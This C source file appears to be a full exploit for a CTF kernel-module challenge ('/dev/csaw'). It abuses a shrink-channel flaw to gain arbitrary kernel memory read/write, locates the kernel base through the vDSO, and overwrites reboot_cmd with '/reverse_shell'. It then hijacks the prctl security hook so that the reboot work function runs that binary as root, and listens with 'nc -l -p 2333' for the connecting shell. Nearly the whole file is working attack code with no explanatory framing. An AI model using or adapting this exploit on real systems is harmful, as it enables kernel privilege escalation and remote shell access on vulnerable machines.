#include <stdio.h>
#include <sys/prctl.h>       
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <sys/auxv.h> 



#define CSAW_IOCTL_BASE     0x77617363
#define CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1
#define CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2
#define CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3
#define CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4
#define CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5
#define CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6
#define CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7
#define CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8


struct alloc_channel_args {
    size_t buf_size;
    int id;
};

struct open_channel_args {
    int id;
};

struct shrink_channel_args {
    int id;
    size_t size;
};

struct read_channel_args {
    int id;
    char *buf;
    size_t count;
};

struct write_channel_args {
    int id;
    char *buf;
    size_t count;
};

struct seek_channel_args {
    int id;
    loff_t index;
    int whence;
};

struct close_channel_args {
    int id;
};

void print_hex(char *buf,size_t len){
    int i ;
    for(i = 0;i<((len/8)*8);i+=8){
        printf("0x%lx",*(size_t *)(buf+i) );
        if (i%16)
            printf(" ");
        else
            printf("\n");
    }
}

void show_vdso_userspace(int len){
    size_t addr=0;
    addr=getauxval(AT_SYSINFO_EHDR);
    if (addr<0){
        puts("[-]cannot get vdso addr");
        return;
    }
    for (int i=len; i<0x1000; i++)
    {
        printf("%x ",*(char *)(addr+i));
    }
}
int check_vdso_shellcode(char *shellcode)
{
    size_t addr=0;
    addr=getauxval(AT_SYSINFO_EHDR);
    printf("vdso:%lx\n",addr);
    if (addr<0){
        puts("[-]cannot get vdso addr");
        return 0;
    }
    if (memmem((char *)addr,0x1000,shellcode,strlen(shellcode))){
        return 1;
    }
    return 0;
}

int main(){
    int fd=-1;
    size_t result=0;
    struct alloc_channel_args alloc_args;
    struct shrink_channel_args shrink_args;
    struct seek_channel_args seek_args;
    struct read_channel_args read_args;
    struct close_channel_args close_args;
    struct write_channel_args write_args;
    size_t addr=0xffffffff80000000;
    size_t read_cred=0;
    size_t cred=0;
    size_t target_addr;
    int root_cred[12];

    size_t kernel_base=0;
    size_t selinux_disable_addr = 0x3607f0;   //ffffffff813607f0 T selinux_disable   - 0xffffffff81000000(vmmap) =0x3607f0
    size_t prctl_hook=0xe9bcd8;             // 0xffffffff81e9bcc0+0x18=0xffffffff81e9bcd8 - 0xffffffff81000000=0xe9bcd8
    size_t order_cmd=0xe4cf40;       //mov    rdi,0xffffffff81e4cf40
    size_t poweroff_work_addr=0xa7590; // ffffffff810a7590 t poweroff_work_func

    setvbuf(stdout,0LL,2,0LL);
    char *buf=malloc(0x1000);
    fd = open("/dev/csaw",O_RDWR);
    if (fd<0){
        puts("[-] open error");
        exit(-1);
    }

    alloc_args.buf_size=0x100;
    alloc_args.id=-1;
    ioctl(fd,CSAW_ALLOC_CHANNEL,&alloc_args);
    if (alloc_args.id==-1){
        puts("[-] alloc_channel error");
        exit(-1);
    }
    printf("[+] now we get a channel %d\n",alloc_args.id);
    shrink_args.id=alloc_args.id;
    shrink_args.size=0x100+1;
    ioctl(fd,CSAW_SHRINK_CHANNEL,&shrink_args);
    puts("[+] we can read and write any memory");
    for(;addr<0xffffffffffffefff;addr+=0x1000)
    {
        seek_args.id=alloc_args.id;
        seek_args.index=addr-0x10;
        seek_args.whence=SEEK_SET;
        ioctl(fd,CSAW_SEEK_CHANNEL,&seek_args);
        read_args.id=alloc_args.id;
        read_args.buf=buf;
        read_args.count=0x1000;
        ioctl(fd,CSAW_READ_CHANNEL,&read_args);
        if (!strcmp("gettimeofday",buf+0x2cd)){
            result=addr;
            printf("[+] found vdso %lx\n",result);
            //int test;
            //scanf("Wait! %d",&test);   //!!!!!  to dump VDSO
            break;
        }
    }
    if (result==0){
        puts("not found , try again ");
        exit(-1);
    }
    kernel_base=addr & 0xffffffffff000000;
    selinux_disable_addr+=kernel_base;
    prctl_hook+=kernel_base;
    order_cmd+=kernel_base;
    poweroff_work_addr+=kernel_base;

    printf("[+] found kernel_base: %p\n",kernel_base);
    printf("[+] found prctl_hook: %p\n",prctl_hook);
    printf("[+] found order_cmd: %p\n",order_cmd);
    printf("[+] found selinux_disable_addr: %p\n",selinux_disable_addr);
    printf("[+] found poweroff_work_addr: %p\n",poweroff_work_addr);

    size_t mce_do_trigger_addr=kernel_base+0x43860;
    size_t mce_helper_addr=kernel_base+0xd3500;
    size_t mce_helper_argv_addr=kernel_base+0xe2a500;
    size_t reboot_work_addr=kernel_base+0xa7260;  //reboot_cmd
    size_t reboot_cmd_addr=kernel_base+0xa17d40; //reboot_cmd

    memset(buf,'\x00',0x1000);
    strcpy(buf,"/reverse_shell;\0");

    //改写order_cmd，并在结尾添\x00
    seek_args.id=alloc_args.id;
    seek_args.index=reboot_cmd_addr-0x10;     //order_cmd  mce_helper_addr  reboot_cmd_addr
    seek_args.whence=SEEK_SET;
    ioctl(fd,CSAW_SEEK_CHANNEL,&seek_args);
    write_args.id=alloc_args.id;
    write_args.buf=buf;
    write_args.count=strlen(buf);
    ioctl(fd,CSAW_WRITE_CHANNEL,&write_args);

    memset(buf,'\x00',0x1000);
    seek_args.id=alloc_args.id;
    seek_args.index=reboot_cmd_addr-0x10+15;  // order_cmd    14  mce_helper_addr reboot_cmd_addr
    seek_args.whence=SEEK_SET;
    ioctl(fd,CSAW_SEEK_CHANNEL,&seek_args);
    write_args.id=alloc_args.id;
    write_args.buf=buf;
    write_args.count=1;
    ioctl(fd,CSAW_WRITE_CHANNEL,&write_args);

    //劫持prctl_hook去执行poweroff_work
    memset(buf,'\x00',0x1000);
    *(size_t *)buf =reboot_work_addr;     //poweroff_work_addr  mce_do_trigger_addr  reboot_work_addr
    seek_args.id=alloc_args.id;
    seek_args.index=prctl_hook-0x10;
    seek_args.whence=SEEK_SET;
    ioctl(fd,CSAW_SEEK_CHANNEL,&seek_args);
    write_args.id=alloc_args.id;
    write_args.buf=buf;
    write_args.count=8;
    ioctl(fd,CSAW_WRITE_CHANNEL,&write_args);
    
    //需要fork()来执行reverse_shell程序
    //int test;
    //scanf("Wait!! %d",&test);
    if (fork()==0) {
        prctl(addr,2,addr,addr,2);
        exit(-1);
    }
    //sleep(6);
    system("nc -l -p 2333");
    return 0;
}
/*
// /arch/x86/kernel/cpu/mcheck/mce.c 1345
static void mce_do_trigger(struct work_struct *work)
{
    call_usermodehelper(mce_helper, mce_helper_argv, NULL, UMH_NO_WAIT);
}
static char         mce_helper[128];
static char         *mce_helper_argv[2] = { mce_helper, NULL };

*/